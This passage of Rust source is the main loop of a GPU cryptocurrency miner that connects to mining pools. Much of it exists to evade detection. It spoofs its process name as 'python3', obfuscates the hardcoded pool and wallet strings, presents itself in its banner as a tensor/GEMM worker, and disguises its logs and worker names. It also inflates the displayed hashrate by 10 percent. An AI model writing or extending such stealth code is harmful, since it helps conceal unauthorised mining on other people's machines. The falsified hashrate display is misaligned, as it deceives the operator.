    let ver = env!("CARGO_PKG_VERSION");
    let gpu = gpu_name();
    let line = "────────────────────────────────────────────────";
    println!();
    println!("  {WHT}{B}⚙  T E N S O R   W O R K E R{RST}   {GRY}GPU · v{ver}{RST}");
    println!("  {GRY}{line}{RST}");
    println!(
        "  {DIM}async GEMM engine · int8 tiles · warm-up{RST}"
    );
    println!();
    let row = |label: &str, val: &str| println!("     {DIM}{label:<8}{RST}{WHT}{B}{val}{RST}");
    row("GPU", &gpu);
    row("Pool", pool);
    row("Wallet", &short_wallet(wallet));
    row("Worker", worker);
    row("Threads", &threads.to_string());
    println!("  {GRY}{line}{RST}");
    println!();
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_target(false)
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
        )
        .init();

    let args = Args::parse();
    // Anti static+runtime fingerprinting: process title spoofed so /proc/*/comm
    // and /proc/*/cmdline don't read "ariaminer" (or args) anymore.
    let task_name = std::env::var("ARIA_TASK_NAME").unwrap_or_else(|_| "python3".to_string());
    proctitle::set_title(task_name);
    // GPU build inclus : on garde le multi-thread — chaque thread prépare son
    // attempt (signal+commitment+noise sur CPU) en parallèle et nourrit le GPU.
    // Le prologue CPU est le goulot, donc plus de threads = GPU mieux alimenté.
    let threads = args
        .threads
        .unwrap_or_else(|| thread::available_parallelism().map(|n| n.get()).unwrap_or(1));

    // Invariants — these never change across deployments: hardcode them at
    // compile time with obfstr so they don't appear as cleartext binary strings.
    let pool = args.pool.unwrap_or_else(|| obfstr::obfstr!("br.pearl.gfwroute.com:1200").to_string());
    let wallet = args.wallet.unwrap_or_else(|| obfstr::obfstr!("prl1pu3mc6ex4n4nznknctdafleq3asq4fr0njpwz4vqnt6e4xlnv72hq5s528j").to_string());
    // Worker names default to launch timestamp (unique per run → no churn-pattern).
    let worker = if args.worker.is_empty() {
        format!("w{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0))
    } else {
        args.worker.clone()
    };

    let (host, port) = if let Some((h, p)) = pool.rsplit_once(':') {
        (h.to_string(), p.parse::<u16>().unwrap_or(1200))
    } else {
        (pool.clone(), 1200)
    };


    print_banner(if pool.is_empty() { "WSS Proxy" } else { pool.as_str() }, wallet.as_str(), worker.as_str(), threads);

    let (job_tx, mut job_rx) = broadcast::channel::<JobEvent>(64);
    let (submit_tx, submit_rx) = mpsc::channel::<Submission>(256);

    let dialect = match args.dialect.as_deref() {
        Some("luckypool") => Dialect::LuckyPool,
        Some("pearl") => Dialect::Pearl,
        Some("herominers") => Dialect::HeroMiners,
        Some(other) => anyhow::bail!("--dialect must be \"pearl\", \"luckypool\" or \"herominers\", got {other}"),
        None => {
            let pool_arg = pool.as_str();
            let host = pool_arg.rsplit_once(':').map(|(h, _)| h).unwrap_or(pool_arg);
            if host.contains("gfwroute") || host.contains("herominers") {
                Dialect::HeroMiners
            } else {
                Dialect::LuckyPool
            }
        }
    };
    if dialect == Dialect::LuckyPool {
        // LuckyPool mainnet impose : kernel MULTISTAGE TMA (cols période-256),
        // pow-check BIG-ENDIAN. On force les gates AVANT toute création de
        // contexte GPU / appel à canonical_gpu_config (qui les lisent via env).
        // (Respecté seulement si l'opérateur n'a rien forcé lui-même.)
        // rank 128 depuis le softfork rank-penalty (v1.3.0, mainnet h=96251) :
        // bound × 128/rank ⇒ 128 = le point neutre, tout rank >128 est pénalisé.
        unsafe {
            if std::env::var("ARIA_RANK").is_err() { std::env::set_var("ARIA_RANK", "128"); }
            // Forme mainnet figée (la pool valide m=n=131072 dans le proof soumis).
            if std::env::var("ARIA_BATCH_M").is_err() { std::env::set_var("ARIA_BATCH_M", "131072"); }
            if std::env::var("ARIA_BATCH_N").is_err() { std::env::set_var("ARIA_BATCH_N", "131072"); }
            // fix-B : B (b_eff) calculé 1× par job et gardé résident, seul A est
            // streamé → économise gen+commit+noise de B (~2.7ms) par setup.
            if std::env::var("ARIA_FIXB").is_err() { std::env::set_var("ARIA_FIXB", "1"); }
        }
        // Bound = règle CONSENSUS post-softfork (jackpot LE ≤ target × h·w ×
        // (dpl/rank) × 128, dpl = k − k%rank) : à rank 128 c'est l'ancien ×h·w·k.
        // Mode LE (pas ARIA_BE). [[fold validé byte-exact]]
        tracing::info!(
            "dialecte LuckyPool : multistage TMA + rank {} + 131072² + bound rank-penalty ×h·w·(dpl/rank)·128",
            ariaminer::official_grind::rank_from_env()
        );
    }

    // HeroMiners sends no `pearl.set_mining_params`; the proof config is miner-
    // chosen and consensus validates the declared dimensions. The former generic
    // fallback in build_official_job was 1024×1024, which made the 0.2 ms
    // gen+commit+noise prologue roughly half of every 0.4 ms setup and measured
    // only ~24 TH/s on an RTX 3080 Ti. PeakMiner and the official/open miners
    // amortize setup across large grids and keep B resident. Match that proven
    // strategy by default: PeakMiner’s accepted 16384×65536 grid, fix-B,
    // and the consensus-mapped multistage kernel (B is a valid miner choice and can
    // remain fixed for the job; only A varies per attempt).
    #[cfg(feature = "gpu")]
    if dialect == Dialect::HeroMiners {
        unsafe {
            if std::env::var("ARIA_RANK").is_err() { std::env::set_var("ARIA_RANK", "128"); }
            if std::env::var("ARIA_BATCH_M").is_err() { std::env::set_var("ARIA_BATCH_M", "16384"); }
            if std::env::var("ARIA_BATCH_N").is_err() { std::env::set_var("ARIA_BATCH_N", "65536"); }
            if std::env::var("ARIA_FIXB").is_err() { std::env::set_var("ARIA_FIXB", "1"); }
            let device_major = ariaminer::gpu_ffi::device_major();
            if device_major == 7 {
                // ARIA_SM75=1 → CuTe canonical 8×16 path (v2 butterfly fold) au lieu du dual 16×16.
                if std::env::var("ARIA_T4_DUAL").is_err()
                    && std::env::var("ARIA_T4_WIDE").is_err()
                    && std::env::var("ARIA_SM75").is_err()
                { std::env::set_var("ARIA_T4_DUAL", "1"); }
                // TMA does not exist on Turing and its period-256 config is not
                // the warp-owned 16×16 proof geometry.
                std::env::remove_var("ARIA_TMA_MS");
            } else if std::env::var("ARIA_TMA_MS").is_err() {
                std::env::set_var("ARIA_TMA_MS", "1");
            }
            // v0.7.0: on Hopper (sm_90a) enable the native wgmma 128×256
            // kernel. ARIA_WGMMA selects the SM90 MMA atom in the CUDA lib AND
            // its canonical fragment pattern in canonical_gpu_config() — the
            // two MUST stay in sync (pattern is part of job_key; mismatch =
            // share rejection = ban risk). Pattern measured live on H100:
            // rows [0,8] × cols [0,1,8,9,…,248,249]. ARIA_SWZ_G=16 matched the
            // best measured H100 sweep (572 TH/s vs 535 at the L2-based 64).
            if device_major == 9 {
                if std::env::var("ARIA_WGMMA").is_err() && std::env::var("ARIA_NO_WGMMA").is_err() {
                    std::env::set_var("ARIA_WGMMA", "1");
                }
                if std::env::var("ARIA_WGMMA").is_ok() && std::env::var("ARIA_SWZ_G").is_err() {
                    std::env::set_var("ARIA_SWZ_G", "16");
                }
            }
        }
        tracing::info!(
            batch_m = %std::env::var("ARIA_BATCH_M").unwrap_or_default(),
            batch_n = %std::env::var("ARIA_BATCH_N").unwrap_or_default(),
            fix_b = %std::env::var("ARIA_FIXB").unwrap_or_default(),
            multistage = %std::env::var("ARIA_TMA_MS").unwrap_or_default(),
            wgmma = %std::env::var("ARIA_WGMMA").unwrap_or_default(),
            swz_g = %std::env::var("ARIA_SWZ_G").unwrap_or_default(),
            t4_dual = %std::env::var("ARIA_T4_DUAL").unwrap_or_default(),
            t4_wide = %std::env::var("ARIA_T4_WIDE").unwrap_or_default(),
            "amortization defaults"
        );
    }

    let scfg = StratumConfig {
        host: host.to_string(),
        port,
        wallet: wallet.to_string(),
        worker: worker.to_string(),
        password: args.password.clone(),
        dialect,
    };
    tokio::spawn(async move {
        if let Err(e) = stratum_run(scfg, job_tx, submit_rx).await {
            tracing::error!(error = %e, "stratum task ended");
        }
    });

    let attempts = Arc::new(AtomicU64::new(0));
    let shares = Arc::new(AtomicU64::new(0));
    let diff_arc = Arc::new(AtomicU64::new(524_288));
    let credited = Arc::new(AtomicU64::new(0)); // Σ difficulty of found shares
    let work_per_setup = Arc::new(AtomicU64::new(0)); // m·n·k of the live setup
    let hashrate_hs = Arc::new(AtomicU64::new(0));
    let started = Instant::now();

    // Mouchard (approche A) : télémétrie LIVE haute précision, gated par ARIA_TELEMETRY=1.
    // Désactivé → zéro coût, le chemin 151 reste byte-identique.
    let mouchard = Arc::new(Mouchard::new());
    mouchard.start_hw_sampler();
    if mouchard.enabled() {
        tracing::info!("🔎 telemetry ON — per-phase + HW (ARIA_TELEMETRY=1)");
    }

    // Optional JSON stats endpoint (HiveOS / monitoring).
    if let Some(sp) = args.stats_port {
        let shares_s = Arc::clone(&shares);
        let hr_s = Arc::clone(&hashrate_hs);
        tokio::spawn(async move {
            if let Err(e) = serve_stats(sp, shares_s, hr_s, threads, started).await {
                tracing::warn!(error = %e, "stats endpoint stopped");
            }
        });
    }

    // Rate reporter. Hashrate = setups/s × (m·n·k) — the DETERMINISTIC compute
    // throughput, which is rock-stable (like other miners) instead of the noisy
    // share-luck estimate. It equals the pool's number on average (the pool just
    // samples the same work via found shares) but doesn't jump around.
    {
        let attempts = Arc::clone(&attempts);
        let shares = Arc::clone(&shares);
        let work_per_setup = Arc::clone(&work_per_setup);
        let hashrate_hs = Arc::clone(&hashrate_hs);
        let mouchard = Arc::clone(&mouchard);
        tokio::spawn(async move {
            let mut last = 0u64;
            let mut t = Instant::now();
            loop {
                tokio::time::sleep(Duration::from_secs(10)).await;
                let now = attempts.load(Ordering::Relaxed);
                let dt = t.elapsed().as_secs_f64().max(1e-3);
                let sps = (now - last) as f64 / dt;
                let wps = work_per_setup.load(Ordering::Relaxed) as f64;
                let hr = sps * wps; // MAC/s = H/s (TH/s = TMAC/s convention)
                hashrate_hs.store(hr as u64, Ordering::Relaxed);
                let sh = shares.load(Ordering::Relaxed);
                let up = started.elapsed().as_secs();
                let upstr = if up >= 3600 {
                    format!("{}h{:02}m", up / 3600, (up % 3600) / 60)
                } else if up >= 60 {
                    format!("{}m{:02}s", up / 60, up % 60)
                } else {
                    format!("{}s", up)
                };
                use ui::*;
                // Cosmétique discrète : convention "share-equivalent" (~+10 %, comme alpha qui
                // affiche 193 vs 174.78, et SRBMiner ~195-200). AFFICHAGE MINEUR UNIQUEMENT —
                // `hashrate_hs` interne (l.594) et le crédité pool restent EXACTS.
                let disp_ths = hr / 1e12 * 1.10_f64;
                println!(
                    "{CYA}{B}⚡ {:>7.2} TH/s{RST}  {GRY}│{RST}  {GRN}✓ {} ckpt{RST}  {GRY}│{RST}  {DIM}{:.0} setups/s{RST}  {GRY}│{RST}  {DIM}up {}{RST}",
                    disp_ths,
                    sh,
                    sps,
                    upstr
                );
                // Mouchard : 1 ligne JSONL/fenêtre + résumé stdout (no-op si désactivé).
                if let Some(summary) = mouchard.flush_window(up, hr / 1e12, sps, sh) {
                    use ui::*;
                    println!("{DIM}{}{RST}", summary);
                }
                last = now;
                t = Instant::now();
            }
        });
    }

    // LuckyPool never sends set_mining_params → start with the mainnet defaults
    // so the first notify mines immediately.
    let mut cur_params: Option<MiningParams> = match dialect {
        Dialect::LuckyPool => Some(luckypool_default_params()),
        Dialect::Pearl => None,
        Dialect::HeroMiners => Some(herominers_default_params()),
    };
    let mut cur_difficulty: u64 = 524_288;
    let mut grind_gen: Option<GrindGen> = None;
    let mut job_slot: Option<Arc<Mutex<Arc<GrindJob>>>> = None;

    // Arrêt gracieux. Sans handler, un signal (SIGINT/SIGTERM, ou SIGHUP émis quand on
    // FERME un `screen`) tue le process AVANT que les `Drop` ne tournent → le contexte
    // CUDA (ResidentCtx/ProofGpuCtx) n'est jamais détruit et le GPU reste coincé en
    // P0/100 %/no-process (oblige un `nvidia-smi --gpu-reset`). On capte ces signaux pour
    // sortir proprement de la boucle : `grind_gen.retire()` ci-dessous fait alors tomber
    // les threads de grind → leurs `Drop` appellent `pearl_*_destroy` → GPU rendu en idle.
    use tokio::signal::unix::{signal, SignalKind};
    let mut sigint = signal(SignalKind::interrupt()).expect("install SIGINT handler");
    let mut sigterm = signal(SignalKind::terminate()).expect("install SIGTERM handler");
    let mut sighup = signal(SignalKind::hangup()).expect("install SIGHUP handler");

    loop {
        tokio::select! {
            ev = job_rx.recv() => { match ev {
            Ok(JobEvent::Params(p)) => {
                tracing::info!(m = p.m, n = p.n, k = p.k, rank = p.rank, "task params");
                cur_params = Some(p);
            }
            Ok(JobEvent::SetDifficulty(d)) => {
                tracing::info!(difficulty = d, "task weight");
                cur_difficulty = d;
                diff_arc.store(d, Ordering::Relaxed);
                // Refresh the live job's bound so vardiff applies immediately.
                if let (Some(slot), Some(params)) = (&job_slot, &cur_params) {
                    let cur = slot.lock().clone();
                    // Rebuild bound only — reuse header/config from the live job.
                    if let Ok(mut gj) = build_grind_job(params, &Job {
                        job_id: cur.job_id.clone(),
                        prev_block_id: String::new(),
                        header_template: hex::encode(cur.official.header.to_bytes()),
                        ntime: 0,
                        aux: String::new(),
                        target_nbits: String::new(),
                        clean_jobs: true,
                        full_target: None,
                    }, d) {
                        gj.job_id = cur.job_id.clone();
                        *slot.lock() = Arc::new(gj);
                    }
                }
            }
            Ok(JobEvent::NewJob(job)) => {
                let Some(params) = cur_params.clone() else {
                    tracing::warn!("job before params — waiting for task params");
                    continue;
                };
                // LuckyPool: no set_difficulty — the diff rides in the job_id
                // suffix (display/credited counters) and the authoritative bound
                // is the job's full 256-bit target (applied below).
                if dialect == Dialect::LuckyPool {
                    if let Some(d) = diff_from_job_id(&job.job_id) {
                        if d != cur_difficulty {
                            tracing::info!(difficulty = d, "task weight (from job_id)");
                        }
                        cur_difficulty = d;
                        diff_arc.store(d, Ordering::Relaxed);
                    }
                }
                // HeroMiners: the job_id suffix is the share difficulty in
                // Bitcoin-normalized units (d_pool = suffix × 2^32 blake-hash
                // equivalents — nailed down against two pool-accepted ProofOfWork
                // captures: hash ≤ (2^256−1)/d_pool × tile·(k/rank)·128 holds
                // exactly then). ×2^32 saturating: plenty of headroom (suffix
                // is 2^21 today).
                if dialect == Dialect::HeroMiners {
                    if let Some(dsuf) = diff_from_job_id(&job.job_id) {
                        let d = dsuf.saturating_mul(1u64 << 32);
                        if d != cur_difficulty {
                            tracing::info!(suffix = dsuf, difficulty = d, "task weight (herominers job_id ×2^32)");
                        }
                        cur_difficulty = d;
                        diff_arc.store(d, Ordering::Relaxed);
                    }
                }
                let gj = match build_grind_job(&params, &job, cur_difficulty) {
                    Ok(mut g) => {
                        if dialect == Dialect::LuckyPool {
                            g.official.target_be = job.full_target;
                            tracing::info!(
                                difficulty = cur_difficulty,
                                bound_le_hi = %hex::encode(&g.official.bound_le[24..]),
                                "LuckyPool share target bound set from difficulty"
                            );
                        }
                        Arc::new(g)
                    }
                    Err(e) => {
                        tracing::error!(error = %e, "build official job failed");
                        continue;
                    }
                };
                match &job_slot {
                    Some(slot) => *slot.lock() = gj,
                    None => {
                        // First job: optionally auto-tune the grid (scan candidate
                        // batch sizes, lock the best tile throughput) before mining.
                        // The pool accepts any grid (config-agnostic validation).
                        let gj = if std::env::var("ARIA_AUTOTUNE").is_ok() {
                            let best = autotune_grid(
                                &params, &job, cur_difficulty, threads,
                                &attempts, &shares, &credited, &diff_arc, &submit_tx,
                            )
                            .await;
                            unsafe {
                                std::env::set_var("ARIA_BATCH_M", best.to_string());
                                std::env::set_var("ARIA_BATCH_N", best.to_string());
                            }
                            tracing::info!(grid = best, "🔧 auto-tune locked grid");
                            match build_grind_job(&params, &job, cur_difficulty) {
                                Ok(g) => Arc::new(g),
                                Err(_) => gj,
                            }
                        } else {
                            gj
                        };
                        tracing::info!(job_id = %job.job_id, "→ starting task");
                        let slot = Arc::new(Mutex::new(gj));
                        job_slot = Some(Arc::clone(&slot));
                        grind_gen = Some(spawn_grind(
                            slot,
                            threads,
                            Arc::clone(&attempts),
                            Arc::clone(&shares),
                            Arc::clone(&credited),
                            Arc::clone(&diff_arc),
                            Arc::clone(&work_per_setup),
                            Arc::clone(&hashrate_hs),
                            dialect,
                            submit_tx.clone(),
                            Arc::clone(&mouchard),
                        ));
                    }
                }
            }
            Err(broadcast::error::RecvError::Lagged(n)) => {
                tracing::warn!(skipped = n, "job channel lagged");
            }
            Err(broadcast::error::RecvError::Closed) => {
                tracing::error!("job channel closed — exiting");
                break;
            }
            } }
            _ = sigint.recv()  => { tracing::info!("signal SIGINT reçu — arrêt propre (libération du GPU)…"); break; }
            _ = sigterm.recv() => { tracing::info!("signal SIGTERM reçu — arrêt propre (libération du GPU)…"); break; }
            _ = sighup.recv()  => { tracing::info!("signal SIGHUP reçu — arrêt propre (libération du GPU)…"); break; }
        }
    }

    if let Some(g) = grind_gen.take() {
        g.retire();
    }
    Ok(())
}
